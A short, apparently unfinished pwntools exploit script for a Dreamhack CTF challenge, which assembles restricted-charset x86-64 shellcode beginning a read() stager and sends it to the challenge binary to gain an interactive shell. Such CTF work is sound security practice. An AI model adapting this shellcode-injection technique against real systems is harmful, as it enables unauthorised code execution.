#!/usr/bin/env python3
from pwn import *

context.binary = "./chall"
context.terminal = ["tmux", "splitw", "-h"]

local = True
if local:
    io = process("./chall")
else:
    io = remote("host1.dreamhack.games", 0)

vmin, vmax = 0x30, 0x4e + 0x31
valid_bytes = bytes(x for x in range(vmin, vmax))
print(f"range: {hex(vmin)}, {hex(vmax)}")

# read(stdin, ptr, count)
shellcode = """
push rbp
pop rdi
push rbx
pop rsi

"""

payload = asm(shellcode)
print(f"payload len = {len(payload)}")
print(disasm(payload))

# gdb.attach(io)

io.send(payload)
io.interactive()
